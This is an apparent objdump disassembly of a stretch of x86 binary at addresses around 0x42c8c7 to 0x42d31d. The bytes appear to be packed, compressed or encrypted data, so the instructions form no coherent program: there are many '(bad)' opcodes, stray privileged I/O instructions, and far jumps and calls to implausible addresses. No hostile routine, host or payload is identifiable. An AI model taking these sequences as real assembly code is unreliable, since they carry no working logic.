  42c8c7:	push   esp
  42c8c8:	push   edx
  42c8c9:	js     0x42c8a4
  42c8cb:	loop   0x42c8f7
  42c8cd:	sti    
  42c8ce:	sti    
  42c8cf:	jbe    0x42c883
  42c8d1:	push   cs
  42c8d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c8d3:	push   esp
  42c8d4:	cmp    BYTE PTR ds:0x247c1e36,dl
  42c8da:	mov    cl,0xab
  42c8dc:	and    eax,ebp
  42c8de:	imul   edx,DWORD PTR [ebx+0x76],0x1a
  42c8e2:	pop    edx
  42c8e3:	pop    es
  42c8e4:	sub    DWORD PTR [ecx-0x41],eax
  42c8e7:	cmp    edx,DWORD PTR [eax-0x734bfb5f]
  42c8ed:	pop    ecx
  42c8ee:	(bad)  
  42c8ef:	pop    esp
  42c8f0:	dec    ecx
  42c8f1:	mov    BYTE PTR [ebx+eiz*4-0x6e77b0d6],bh
  42c8f8:	je     0x42c94c
  42c8fa:	sub    BYTE PTR [ecx-0x46],dh
  42c8fd:	outs   dx,BYTE PTR ds:[esi]
  42c8fe:	shr    BYTE PTR [eax],0xdb
  42c901:	mov    bh,0x8a
  42c903:	mov    cl,0x46
  42c905:	retf   0xcb2c
  42c908:	sub    ah,BYTE PTR [ebx+edi*4-0xc88a20d]
  42c90f:	xchg   ebx,eax
  42c910:	push   ecx
  42c911:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c912:	inc    ebx
  42c913:	xor    al,0x77
  42c915:	mov    ecx,DWORD PTR [eax-0x3904c06b]
  42c91b:	fdivr  QWORD PTR [esi+0x348780]
  42c921:	or     dl,bl
  42c923:	add    eax,0x62c78970
  42c928:	pop    ecx
  42c929:	je     0x42c8b7
  42c92b:	neg    DWORD PTR [edx]
  42c92d:	fsub   st(4),st
  42c92f:	push   esi
  42c930:	ror    bl,1
  42c932:	push   ebp
  42c933:	aam    0x4
  42c935:	ds int3 
  42c937:	clc    
  42c938:	mov    ch,0x81
  42c93a:	gs push cs
  42c93c:	fisubr WORD PTR [esi-0x3]
  42c93f:	inc    esi
  42c940:	add    BYTE PTR ds:[eax],al
	...
  42c9b3:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42c9b9:	neg    ebx
  42c9bb:	outs   dx,DWORD PTR ds:[esi]
  42c9bc:	mov    ch,0xda
  42c9be:	push   esi
  42c9bf:	and    ch,BYTE PTR [edi-0x64]
  42c9c2:	push   es
  42c9c3:	enter  0xd7ad,0x1
  42c9c7:	add    ch,dh
  42c9c9:	add    BYTE PTR [eax],al
  42c9cb:	add    BYTE PTR ds:0x2df3b9cc,cl
  42c9d1:	fsub   QWORD PTR [esi]
  42c9d3:	test   DWORD PTR [edi-0x127cf704],eax
  42c9d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c9da:	push   ds
  42c9db:	mov    ch,0x71
  42c9dd:	pop    ebp
  42c9de:	xor    DWORD PTR [eax],ecx
  42c9e0:	push   0x7a
  42c9e2:	sub    al,0x13
  42c9e4:	test   eax,0xe1fb4c82
  42c9e9:	dec    edi
  42c9ea:	(bad)  
  42c9eb:	xchg   edi,eax
  42c9ec:	xchg   edx,eax
  42c9ed:	addr16 nop
  42c9ef:	inc    edi
  42c9f0:	mov    ds,WORD PTR [esi-0x538094ae]
  42c9f6:	jae    0x42c9b5
  42c9f8:	in     eax,0x35
  42c9fa:	ret    0xb503
  42c9fd:	test   al,0x23
  42c9ff:	ins    BYTE PTR es:[edi],dx
  42ca00:	sbb    al,ah
  42ca02:	jp     0x42ca4a
  42ca04:	hlt    
  42ca05:	scas   eax,DWORD PTR es:[edi]
  42ca06:	pop    ebp
  42ca07:	pop    edx
  42ca08:	pushf  
  42ca09:	out    dx,al
  42ca0a:	sub    eax,0xf101373a
  42ca0f:	and    DWORD PTR [edi-0x23],esi
  42ca12:	pop    esi
  42ca13:	jg     0x42ca21
  42ca15:	jo     0x42c9b3
  42ca17:	mul    BYTE PTR [eax-0xf3d0abe]
  42ca1d:	mov    ch,0x83
  42ca1f:	bnd ret 
  42ca21:	push   ebp
  42ca22:	jmp    DWORD PTR [edi+0x4a]
  42ca25:	xchg   edi,eax
  42ca26:	inc    ebp
  42ca27:	shl    BYTE PTR [edi-0x2e6494df],1
  42ca2d:	addr16 retf 0x2c88
  42ca31:	mov    cl,0x51
  42ca33:	or     cl,BYTE PTR [edx-0x4c1130c6]
  42ca39:	fadd   DWORD PTR [ebp+0x1786d48]
  42ca3f:	jne    0x42c9cc
  42ca41:	pop    esp
  42ca42:	sahf   
  42ca43:	cli    
  42ca44:	popf   
  42ca45:	mov    al,ds:0xa420c9f9
  42ca4a:	retf   
  42ca4b:	lods   eax,DWORD PTR ds:[esi]
  42ca4c:	xlat   BYTE PTR ds:[ebx]
  42ca4d:	ds pop ebp
  42ca4f:	int3   
  42ca50:	jno    0x42c9f4
  42ca52:	loope  0x42cace
  42ca54:	jge    0x42ca36
  42ca56:	jg     0x42ca21
  42ca58:	pop    ebx
  42ca59:	sbb    eax,0x1f8bf7b3
  42ca5e:	inc    esi
  42ca5f:	fcomp  QWORD PTR [eax+edi*4+0x28e70bbb]
  42ca66:	or     al,0xa5
  42ca68:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  42ca6a:	pushf  
  42ca6b:	lods   eax,DWORD PTR ds:[esi]
  42ca6c:	in     eax,0x61
  42ca6e:	xlat   BYTE PTR ds:[ebx]
  42ca6f:	jo     0x42c9f3
  42ca71:	fcom   st(0)
  42ca73:	out    dx,al
  42ca74:	enter  0x9175,0x38
  42ca78:	cli    
  42ca79:	ror    dh,cl
  42ca7b:	cmp    eax,DWORD PTR [esi+0x3a]
  42ca7e:	cmp    eax,0x66731154
  42ca83:	jo     0x42ca98
  42ca85:	sbb    dh,dh
  42ca87:	cmp    edi,edx
  42ca89:	or     eax,DWORD PTR [ebx-0x32]
  42ca8c:	test   ebx,0x1c5eae1c
  42ca92:	neg    DWORD PTR [ebx]
  42ca94:	stos   DWORD PTR es:[edi],eax
  42ca95:	push   0x5302965d
  42ca9a:	jecxz  0x42cae5
  42ca9c:	cwde   
  42ca9d:	das    
  42ca9e:	ds aas 
  42caa0:	lods   eax,DWORD PTR ds:[esi]
  42caa1:	ret    0xaaec
  42caa4:	imul   edx,DWORD PTR [ebx+0x224eacca],0x2c6fcaf5
  42caae:	sbb    esi,DWORD PTR [edx]
  42cab0:	or     BYTE PTR [edx],0xce
  42cab3:	cld    
  42cab4:	imul   eax,DWORD PTR [edi-0x5da26bf5],0xf8afe8ba
  42cabe:	in     al,0xf9
  42cac0:	add    eax,0x0
	...
  42cb31:	add    BYTE PTR [eax],al
  42cb33:	add    BYTE PTR [eax+ebp*1],dh
  42cb36:	add    DWORD PTR [esi],eax
  42cb38:	sbb    eax,0x6e3a372f
  42cb3d:	(bad)  
  42cb3e:	sbb    al,al
  42cb40:	add    BYTE PTR [esi-0x275db6cc],ah
  42cb46:	add    DWORD PTR [eax],eax
  42cb48:	cmc    
  42cb49:	add    BYTE PTR [eax],al
  42cb4b:	add    BYTE PTR [edi],bl
  42cb4d:	inc    esp
  42cb4e:	or     eax,0xf7119dc4
  42cb53:	push   ebx
  42cb54:	fsub   st(6),st
  42cb56:	mov    esi,0xe556126
  42cb5b:	nop
  42cb5c:	sub    eax,0x8d5c1ade
  42cb61:	cs mov cl,0xe
  42cb64:	fld    QWORD PTR [eax+0x57]
  42cb67:	popf   
  42cb68:	ret    0xc239
  42cb6b:	addr16 jmp 0xd52d:0x72b1aa7e
  42cb73:	popa   
  42cb74:	pop    edx
  42cb75:	and    al,0xb1
  42cb77:	cmp    DWORD PTR [edi-0x2ed957ae],edi
  42cb7d:	cli    
  42cb7e:	es addr16 dec ecx
  42cb81:	xor    dh,BYTE PTR [edx+0x67039fb0]
  42cb87:	mov    cl,0x87
  42cb89:	fwait
  42cb8a:	daa    
  42cb8b:	nop
  42cb8c:	mov    ds:0x946f952,eax
  42cb91:	adc    cl,BYTE PTR [ecx+ebx*1+0xb419417]
  42cb98:	xchg   esp,eax
  42cb99:	out    0x79,al
  42cb9b:	daa    
  42cb9c:	icebp  
  42cb9d:	std    
  42cb9e:	push   cs
  42cb9f:	push   ebx
  42cba0:	mov    BYTE PTR [edx+0x5e3dc9d5],bl
  42cba6:	xchg   esp,eax
  42cba7:	cs push ecx
  42cba9:	sub    BYTE PTR [ebp+0x2a],0x3b
  42cbad:	mov    bl,bh
  42cbaf:	add    al,0xc3
  42cbb1:	jnp    0x42cb49
  42cbb3:	add    al,0xbe
  42cbb5:	add    ah,ah
  42cbb7:	repz pop ecx
  42cbb9:	es push ecx
  42cbbb:	iret   
  42cbbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cbbd:	dec    esi
  42cbbe:	or     ah,dh
  42cbc0:	mov    bh,0x13
  42cbc2:	mov    esp,0xc75f6b6b
  42cbc7:	fisttp WORD PTR [ebx+eiz*1]
  42cbca:	inc    edx
  42cbcb:	pop    es
  42cbcc:	(bad)  
  42cbce:	cwde   
  42cbcf:	xchg   edx,eax
  42cbd0:	test   BYTE PTR [edx+0x3],ah
  42cbd3:	(bad)  
  42cbd4:	push   ecx
  42cbd5:	inc    edi
  42cbd6:	sub    BYTE PTR [edx+0x3386dc28],0x0
  42cbdd:	sbb    ebp,ecx
  42cbdf:	xchg   ebx,eax
  42cbe0:	shl    esi,0x9a
  42cbe3:	retf   0x912f
  42cbe6:	jno    0x42cbf4
  42cbe8:	(bad)  
  42cbe9:	fldenv [edi+ebx*1+0x6c]
  42cbed:	xor    BYTE PTR ds:0xf2b50c89,0x1a
  42cbf4:	stc    
  42cbf5:	shr    DWORD PTR [edi-0x25f8cfd9],cl
  42cbfb:	xor    ch,cl
  42cbfd:	cdq    
  42cbfe:	inc    ebx
  42cbff:	outs   dx,DWORD PTR ds:[esi]
  42cc00:	lods   eax,DWORD PTR ds:[esi]
  42cc01:	cmc    
  42cc02:	stc    
  42cc03:	cmp    DWORD PTR [ebp+ebp*4+0x4350f67f],esi
  42cc0a:	cmp    ebx,esp
  42cc0c:	dec    BYTE PTR [edi+0x4fdd97df]
  42cc12:	adc    al,dl
  42cc14:	dec    ebx
  42cc15:	and    BYTE PTR [edi+0x40cde9d6],0x3e
  42cc1c:	jne    0x42cc8b
  42cc1e:	fs out dx,eax
  42cc20:	out    0x1d,al
  42cc22:	cmp    BYTE PTR [eax],dl
  42cc24:	pop    ebp
  42cc25:	add    al,0xb2
  42cc27:	and    eax,0xffffffb3
  42cc2a:	js     0x42cbc9
  42cc2c:	push   es
  42cc2d:	sbb    eax,0x502119a7
  42cc32:	or     bl,dl
  42cc34:	or     DWORD PTR [ebx+0x62],ebx
  42cc37:	mov    al,0xab
  42cc39:	pop    ss
  42cc3a:	idiv   BYTE PTR [edi-0xd]
  42cc3d:	add    cl,ch
  42cc3f:	pop    ebp
  42cc40:	out    0x0,al
	...
  42ccb2:	add    BYTE PTR [eax],al
  42ccb4:	mov    al,0xb6
  42ccb6:	pushf  
  42ccb7:	adc    al,0x9e
  42ccb9:	ds mov eax,0xcad7b5b6
  42ccbf:	sub    eax,DWORD PTR [edx]
  42ccc1:	clc    
  42ccc2:	lea    edi,ds:0x1d997
  42ccc8:	cmc    
  42ccc9:	add    BYTE PTR [eax],al
  42cccb:	add    BYTE PTR [ebx+0x27a2d651],bh
  42ccd1:	mov    ah,0xa9
  42ccd3:	mov    bl,0x3b
  42ccd5:	pop    ecx
  42ccd6:	aad    0x88
  42ccd8:	mov    ah,0xd0
  42ccda:	mov    edi,0xed84193f
  42ccdf:	cmp    BYTE PTR [ecx],bl
  42cce1:	inc    esp
  42cce2:	mov    dh,0x6e
  42cce4:	pusha  
  42cce5:	and    dl,BYTE PTR [esi+0x11]
  42cce8:	mov    bl,0xcc
  42ccea:	and    al,0x6
  42ccec:	outs   dx,DWORD PTR ds:[esi]
  42cced:	and    eax,0x1d500c04
  42ccf2:	pusha  
  42ccf3:	pusha  
  42ccf4:	lea    ecx,[esi]
  42ccf6:	iret   
  42ccf7:	push   cs
  42ccf8:	pop    ecx
  42ccf9:	pop    esp
  42ccfa:	mov    ah,0x87
  42ccfc:	and    ebp,edi
  42ccfe:	push   es
  42ccff:	cmp    dh,dl
  42cd01:	mov    bl,0x6e
  42cd03:	call   0x855c75e5
  42cd08:	jno    0x42ccd9
  42cd0a:	sub    BYTE PTR [eax+0xbe40618],0x8e
  42cd11:	mov    esi,0x61fca8b2
  42cd16:	add    ch,BYTE PTR [edi]
  42cd18:	or     ch,BYTE PTR [ecx+ecx*1-0x27]
  42cd1c:	xchg   esi,eax
  42cd1d:	clc    
  42cd1e:	mov    ch,0xcf
  42cd20:	imul   ecx,ebp,0xf86b6cf1
  42cd26:	mov    ebx,0xa7a629c2
  42cd2b:	call   0x56b2:0x2d1a5161
  42cd32:	daa    
  42cd33:	mov    DWORD PTR [edi-0x7301f22e],esi
  42cd39:	repz inc ebp
  42cd3b:	repnz sbb al,0x2b
  42cd3e:	jle    0x42cd0a
  42cd40:	xchg   ebp,eax
  42cd41:	out    dx,al
  42cd42:	mov    ebx,0x2b66f1
  42cd47:	or     al,bl
  42cd49:	popa   
  42cd4a:	ss pop ebp
  42cd4c:	add    al,0x2c
  42cd4e:	jo     0x42cdb6
  42cd50:	mov    cl,al
  42cd52:	cwde   
  42cd53:	loope  0x42cd7e
  42cd55:	inc    esi
  42cd56:	dec    eax
  42cd57:	push   ss
  42cd58:	int    0xb7
  42cd5a:	ror    esp,cl
  42cd5c:	inc    eax
  42cd5d:	rol    DWORD PTR [edx],1
  42cd5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cd60:	pop    ss
  42cd61:	xchg   ecx,eax
  42cd62:	inc    ebp
  42cd63:	lock cmp dl,bh
  42cd66:	pop    edx
  42cd67:	pop    ss
  42cd68:	xchg   esi,eax
  42cd69:	xchg   edi,eax
  42cd6a:	lds    ebp,FWORD PTR [ebx+0x2d82763e]
  42cd70:	pop    edi
  42cd71:	rol    DWORD PTR [ecx+ebp*8+0x50],0x26
  42cd76:	mov    ah,0x9a
  42cd78:	dec    ecx
  42cd79:	bound  edi,QWORD PTR [edi-0x2f]
  42cd7c:	scas   eax,DWORD PTR es:[edi]
  42cd7d:	mov    edi,DWORD PTR [esi+0x7268e67e]
  42cd83:	push   esi
  42cd84:	call   0xdaa8:0xe8c80840
  42cd8b:	xor    BYTE PTR [ebx+esi*4+0x4ea4a8],bl
  42cd92:	gs xchg esi,eax
  42cd94:	stos   DWORD PTR es:[edi],eax
  42cd95:	arpl   WORD PTR [edi],di
  42cd97:	aam    0xf5
  42cd99:	int    0xa3
  42cd9b:	jmp    DWORD PTR [esi-0x75abce8]
  42cda1:	lock sub DWORD PTR [ebx+eax*2-0x7e],edi
  42cda6:	lods   al,BYTE PTR ds:[esi]
  42cda7:	mov    al,0xcf
  42cda9:	out    0xc1,eax
  42cdab:	ins    DWORD PTR es:[edi],dx
  42cdac:	jbe    0x42cdd4
  42cdae:	aam    0xee
  42cdb0:	pop    ebp
  42cdb1:	mov    dl,0x7a
  42cdb3:	out    0xca,al
  42cdb5:	mov    ch,0xa
  42cdb7:	scas   eax,DWORD PTR es:[edi]
  42cdb8:	xchg   DWORD PTR [edx-0x2e],edi
  42cdbb:	mov    edi,0x3b7e670
  42cdc0:	outs   dx,BYTE PTR ds:[esi]
	...
  42ce31:	add    BYTE PTR [eax],al
  42ce33:	add    BYTE PTR [edi-0x825b8e0],dl
  42ce39:	call   FWORD PTR [edi+0x410aba6d]
  42ce3f:	sbb    DWORD PTR [edi-0x43],esi
  42ce42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ce43:	stos   BYTE PTR es:[edi],al
  42ce44:	mov    edx,ds
  42ce46:	add    DWORD PTR [eax],eax
  42ce48:	cmc    
  42ce49:	add    BYTE PTR [eax],al
  42ce4b:	add    BYTE PTR [ebp-0x33],al
  42ce4e:	jmp    0x506:0xaa288bc1
  42ce55:	push   eax
  42ce56:	or     bl,BYTE PTR ds:0x9e37140b
  42ce5c:	movaps xmm4,XMMWORD PTR [ecx+0x5cf524a]
  42ce63:	iret   
  42ce64:	add    ecx,ecx
  42ce66:	xchg   edi,eax
  42ce67:	shr    BYTE PTR [ebp-0x5d4effdb],0xba
  42ce6e:	sbb    BYTE PTR [esi+0x983f376],ch
  42ce74:	ret    
  42ce75:	ins    DWORD PTR es:[edi],dx
  42ce76:	les    edx,FWORD PTR ds:0x9bb825fc
  42ce7c:	sti    
  42ce7d:	clc    
  42ce7e:	lods   al,BYTE PTR ds:[esi]
  42ce7f:	adc    ah,BYTE PTR [ebp-0x75]
  42ce82:	sbb    eax,0x9a559bc6
  42ce87:	jo     0x42cebd
  42ce89:	adc    BYTE PTR [edx+0x59],bh
  42ce8c:	pusha  
  42ce8d:	mov    WORD PTR [edx+ecx*1+0x9],es
  42ce91:	jge    0x42cee0
  42ce93:	rcl    BYTE PTR [edi+0x446f674e],cl
  42ce99:	sbb    DWORD PTR [esi-0x6034848],ebx
  42ce9f:	fld    QWORD PTR [edi+eiz*4+0x79]
  42cea3:	fnstcw WORD PTR [ecx-0x66bfde97]
  42cea9:	pop    ebx
  42ceaa:	dec    esi
  42ceab:	mov    edi,0x8151e45a
  42ceb0:	xchg   esp,eax
  42ceb1:	int    0xdd
  42ceb3:	hlt    
  42ceb4:	jmp    0x4415:0xfe94a2f4
  42cebb:	or     eax,0x3331510e
  42cec0:	pop    ebx
  42cec1:	mov    dh,0x6e
  42cec3:	add    ch,BYTE PTR ds:0x7c7b878b
  42cec9:	int    0xb6
  42cecb:	cmp    esp,DWORD PTR [ecx+0x64]
  42cece:	in     al,0xc6
  42ced0:	jg     0x42cf19
  42ced2:	(bad)  
  42ced3:	aas    
  42ced4:	div    BYTE PTR [edi-0x7e]
  42ced7:	add    al,BYTE PTR [esi+esi*4]
  42ceda:	push   0xffffffc3
  42cedc:	xor    al,0xf4
  42cede:	aam    0xea
  42cee0:	pop    edx
  42cee1:	jge    0x42ced8
  42cee3:	pusha  
  42cee4:	out    0x3f,eax
  42cee6:	js     0x42ce97
  42cee8:	outs   dx,BYTE PTR ds:[esi]
  42cee9:	mov    ds:0x9d520be2,al
  42ceee:	lock js 0x42cf45
  42cef1:	or     BYTE PTR [ebp+0x32d927ca],al
  42cef7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cef8:	bound  eax,QWORD PTR [esi]
  42cefa:	fistp  QWORD PTR [esi-0xf]
  42cefd:	mov    al,0x7b
  42ceff:	jge    0x42cef7
  42cf01:	mov    esp,DWORD PTR [esi-0x669328ea]
  42cf07:	jno    0x42cf6c
  42cf09:	sbb    eax,0x33489224
  42cf0e:	cmp    DWORD PTR [ebx-0x18],esi
  42cf11:	jecxz  0x42ce9f
  42cf13:	arpl   WORD PTR ds:0x4a4266b,bx
  42cf19:	fwait
  42cf1a:	push   esp
  42cf1b:	aam    0x70
  42cf1d:	enter  0xd4a2,0xcc
  42cf21:	cwde   
  42cf22:	pop    eax
  42cf23:	jbe    0x42ced1
  42cf25:	(bad)  
  42cf26:	out    dx,eax
  42cf27:	push   esi
  42cf28:	jl     0x42cf6a
  42cf2a:	inc    ecx
  42cf2b:	retf   0xa54e
  42cf2e:	mov    DWORD PTR [esi+0x1b5e6315],ebx
  42cf34:	loop   0x42cecf
  42cf36:	dec    eax
  42cf37:	push   ds
  42cf38:	mov    dh,0x27
  42cf3a:	out    0xcb,al
  42cf3c:	(bad)  
  42cf3d:	(bad)  
  42cf3f:	mov    edi,0x63
	...
  42cfb4:	cmp    dl,BYTE PTR [edx-0x800cd89]
  42cfba:	jg     0x42cf56
  42cfbc:	loope  0x42cfcc
  42cfbe:	cs mov al,0x52
  42cfc1:	test   al,0x59
  42cfc3:	js     0x42cf46
  42cfc5:	fild   DWORD PTR [ecx]
  42cfc7:	add    ch,dh
  42cfc9:	add    BYTE PTR [eax],al
  42cfcb:	add    BYTE PTR [ecx-0x5],cl
  42cfce:	fwait
  42cfcf:	dec    edi
  42cfd0:	add    edx,DWORD PTR [eax]
  42cfd2:	sub    al,0xeb
  42cfd4:	mov    ebp,0x85cf2224
  42cfd9:	imul   esp,DWORD PTR [edi],0xffffffc2
  42cfdc:	pop    ebp
  42cfdd:	mov    bl,0x3a
  42cfdf:	or     DWORD PTR [edi+ecx*8],0xffffffb5
  42cfe3:	inc    eax
  42cfe4:	out    dx,eax
  42cfe5:	cld    
  42cfe6:	ins    DWORD PTR es:[edi],dx
  42cfe7:	inc    ecx
  42cfe8:	test   eax,0xe7ff77b5
  42cfed:	mov    fs,eax
  42cfef:	inc    esi
  42cff0:	ss icebp 
  42cff2:	cld    
  42cff3:	jp     0x42d02f
  42cff5:	adc    eax,0x2ab5aa13
  42cffa:	add    DWORD PTR [eax],ecx
  42cffc:	outs   dx,DWORD PTR ds:[esi]
  42cffd:	xchg   ebp,eax
  42cffe:	and    al,0x24
  42d000:	and    edi,DWORD PTR [edx+0x46]
  42d003:	cli    
  42d004:	pop    esp
  42d005:	add    DWORD PTR [eax-0x15c710ff],esp
  42d00b:	adc    ebp,DWORD PTR [edx+esi*8]
  42d00e:	jmp    0x42cfe5
  42d010:	inc    ebp
  42d011:	loopne 0x42cfb8
  42d013:	adc    al,0xe2
  42d015:	mov    dl,0x6
  42d017:	pusha  
  42d018:	ja     0x42d025
  42d01a:	or     eax,0x518ad581
  42d01f:	es dec esp
  42d021:	mov    eax,ds:0xb667163a
  42d026:	inc    esp
  42d027:	(bad)  
  42d028:	mov    cl,0x3e
  42d02a:	in     al,0xaa
  42d02c:	shr    DWORD PTR [ebp-0x1dc92957],cl
  42d032:	mov    ah,dl
  42d034:	inc    edi
  42d035:	or     al,0xd8
  42d037:	jb     0x42cff5
  42d039:	sub    eax,0xbdd83ef4
  42d03e:	mov    dl,0x56
  42d040:	popf   
  42d041:	sbb    eax,0x47704386
  42d046:	pop    edi
  42d047:	pop    ds
  42d048:	dec    ecx
  42d049:	call   0xd1b1868c
  42d04e:	sub    eax,0x9fd36ddc
  42d053:	mov    eax,ds:0x7e33abd5
  42d058:	idiv   BYTE PTR [eax-0x32]
  42d05b:	packssdw mm3,QWORD PTR [ebx+ecx*1]
  42d05f:	pushf  
  42d060:	adc    esp,0xffffff8d
  42d063:	jno    0x42d029
  42d065:	pop    es
  42d066:	xchg   DWORD PTR [ecx],edi
  42d068:	(bad)  
  42d069:	out    dx,al
  42d06a:	mov    esi,0x68caa64a
  42d06f:	leave  
  42d070:	xor    eax,0x70970a2d
  42d075:	jg     0xb10b2e6a
  42d07b:	sbb    BYTE PTR [edx],cl
  42d07d:	jp     0x42d049
  42d07f:	outs   dx,DWORD PTR ds:[esi]
  42d080:	iret   
  42d081:	fwait
  42d082:	jmp    0x6ab78c71
  42d087:	add    esi,DWORD PTR [edi-0x68]
  42d08a:	pand   mm5,QWORD PTR [esi]
  42d08d:	cmp    ebx,edi
  42d08f:	(bad)  
  42d091:	jmp    0xa41a:0xb7d9ee89
  42d098:	popa   
  42d099:	pop    esi
  42d09a:	dec    ebp
  42d09b:	xchg   ebx,eax
  42d09c:	cmp    eax,0xbe948bc5
  42d0a1:	xchg   edi,eax
  42d0a2:	call   0x5f512016
  42d0a7:	fidiv  WORD PTR [ecx-0x29]
  42d0aa:	sbb    al,0x55
  42d0ac:	push   eax
  42d0ad:	fmul   QWORD PTR [ebp+0x64]
  42d0b0:	adc    BYTE PTR [eax],dh
  42d0b2:	xchg   edi,eax
  42d0b3:	mov    ebp,0x6f317bbf
  42d0b8:	in     eax,0x82
  42d0ba:	jns    0x42d123
  42d0bc:	aad    0xa4
  42d0be:	and    eax,0x6537
	...
  42d133:	add    BYTE PTR [ecx-0x7e],ch
  42d136:	int    0xae
  42d138:	out    dx,eax
  42d139:	out    dx,eax
  42d13a:	imul   eax,edi,0x41
  42d13d:	cdq    
  42d13e:	xor    eax,0x7319fa50
  42d143:	pop    ebx
  42d144:	jbe    0x42d122
  42d146:	add    DWORD PTR [eax],eax
  42d148:	cmc    
  42d149:	add    BYTE PTR [eax],al
  42d14b:	add    dl,cl
  42d14d:	xchg   esp,eax
  42d14e:	mov    BYTE PTR [eax+0x20272901],cl
  42d154:	pop    es
  42d155:	test   DWORD PTR [edx-0x37],ecx
  42d158:	or     bh,BYTE PTR [ecx-0x536a5188]
  42d15e:	loope  0x42d139
  42d160:	and    DWORD PTR [ebp+0x7e],ebx
  42d163:	dec    ecx
  42d164:	(bad)  
  42d165:	pop    esp
  42d166:	arpl   WORD PTR [ecx+ecx*1+0x55],cx
  42d16a:	and    esp,DWORD PTR [ebp+0xd]
  42d16d:	ss loope 0x42d1a6
  42d170:	stos   DWORD PTR es:[edi],eax
  42d171:	mov    bl,0xc1
  42d173:	mov    esp,0xa865be15
  42d178:	sbb    ah,BYTE PTR [esi-0x29279f72]
  42d17e:	inc    ebp
  42d17f:	pop    esp
  42d180:	xlat   BYTE PTR ds:[ebx]
  42d181:	fdivr  st(3),st
  42d183:	inc    ebp
  42d184:	pop    ebx
  42d185:	or     al,0x3c
  42d187:	in     al,dx
  42d188:	inc    esi
  42d189:	clc    
  42d18a:	shl    DWORD PTR [ebp+0x4419475d],1
  42d190:	cmp    bl,dh
  42d192:	adc    ah,BYTE PTR [edx]
  42d194:	jmp    0x42d17f
  42d196:	sub    DWORD PTR [esi+0x17d549de],ebp
  42d19c:	mov    edx,0xd73060c0
  42d1a1:	jge    0x42d190
  42d1a3:	cmp    DWORD PTR [edx-0xfd1c964],esp
  42d1a9:	adc    dl,BYTE PTR [ebp+edi*8-0x9]
  42d1ad:	cld    
  42d1ae:	and    BYTE PTR [eax+eiz*2],ah
  42d1b1:	repnz cmp cl,dh
  42d1b4:	das    
  42d1b5:	pop    edi
  42d1b6:	or     al,0xe2
  42d1b8:	xor    esp,DWORD PTR [eax]
  42d1ba:	cmp    eax,0x40d019e1
  42d1bf:	jle    0x42d1b3
  42d1c1:	or     al,0xed
  42d1c3:	add    eax,0xa3641a91
  42d1c8:	push   ebx
  42d1c9:	xor    eax,0x755bf48b
  42d1ce:	test   BYTE PTR [ecx-0x4d],al
  42d1d1:	pop    ds
  42d1d2:	js     0x42d155
  42d1d4:	out    dx,al
  42d1d5:	pop    ds
  42d1d6:	push   es
  42d1d7:	cld    
  42d1d8:	fild   WORD PTR [esi+0x38128051]
  42d1de:	in     al,dx
  42d1df:	jo     0x42d23d
  42d1e1:	bound  ebx,QWORD PTR [ecx]
  42d1e3:	pop    edx
  42d1e4:	sbb    al,0x6
  42d1e6:	jns    0x42d18e
  42d1e8:	rcr    DWORD PTR [edi-0x3d],1
  42d1eb:	pop    es
  42d1ec:	mov    esp,0xa8ceafb9
  42d1f1:	outs   dx,BYTE PTR ds:[esi]
  42d1f2:	leavew 
  42d1f4:	rcl    DWORD PTR [ecx],1
  42d1f6:	fld    TBYTE PTR [eax+0x2806be13]
  42d1fc:	adc    ecx,DWORD PTR [ebp+edi*8-0x1b58ecf4]
  42d203:	mov    ecx,0x2ac40769
  42d208:	push   eax
  42d209:	push   eax
  42d20a:	dec    ebp
  42d20b:	xchg   esi,eax
  42d20c:	fild   QWORD PTR [ecx]
  42d20e:	jne    0x42d19b
  42d210:	mov    cl,0xad
  42d212:	adc    esi,DWORD PTR [ecx+0x65fffb58]
  42d218:	idiv   BYTE PTR [edx+0x7b30d0f9]
  42d21e:	(bad)  
  42d21f:	mov    esp,0x8e0c8ca6
  42d224:	(bad)  
  42d225:	repnz xlat BYTE PTR ds:[ebx]
  42d227:	pop    edi
  42d228:	or     cl,BYTE PTR [ecx]
  42d22a:	fst    DWORD PTR [eax+eiz*4-0x162ce75a]
  42d231:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d232:	xor    eax,0xc923079a
  42d237:	xchg   esp,eax
  42d238:	std    
  42d239:	push   eax
  42d23a:	sub    eax,0xc47d9640
  42d23f:	icebp  
  42d240:	int    0x0
	...
  42d2b2:	add    BYTE PTR [eax],al
  42d2b4:	out    0xf,al
  42d2b6:	fldcw  WORD PTR [ebp-0x7]
  42d2b9:	push   esi
  42d2bb:	(bad)  
  42d2bc:	xchg   ebp,eax
  42d2bd:	fsubr  DWORD PTR [esi-0x16]
  42d2c0:	leave  
  42d2c1:	sub    edx,ecx
  42d2c3:	sub    BYTE PTR [ebx-0x23],0x1
  42d2c7:	add    ch,dh
  42d2c9:	add    BYTE PTR [eax],al
  42d2cb:	add    BYTE PTR [edi-0x43],al
  42d2ce:	inc    ecx
  42d2cf:	mov    dl,0xdb
  42d2d1:	neg    ebp
  42d2d3:	(bad)  
  42d2d4:	(bad)  
  42d2d5:	and    bl,BYTE PTR es:[ebp-0x65]
  42d2d9:	pop    ds
  42d2da:	imul   eax,DWORD PTR [ebp+ebp*8-0x37239dda],0xffffff9c
  42d2e2:	mov    dl,0x71
  42d2e4:	jae    0x42d32c
  42d2e6:	cwde   
  42d2e7:	fild   WORD PTR ds:0x70ca8d4a
  42d2ed:	sti    
  42d2ee:	loope  0x42d344
  42d2f0:	mov    bh,0xb0
  42d2f2:	gs dec ecx
  42d2f4:	ja     0x42d2db
  42d2f6:	cmc    
  42d2f7:	int    0x13
  42d2f9:	pop    ss
  42d2fa:	mov    esp,0x7a9cf1e3
  42d2ff:	sbb    BYTE PTR [eax],al
  42d301:	sub    ecx,0x625bcd36
  42d307:	jb     0x42d2e2
  42d309:	xor    DWORD PTR [ebp+0x26],edx
  42d30c:	repnz mov ebx,0xee427d7b
  42d312:	xor    cl,BYTE PTR [ebp+0x6402beb5]
  42d318:	mov    ds:0x392c4854,al
  42d31d:	test   DWORD PTR [edx+0x41],ebx
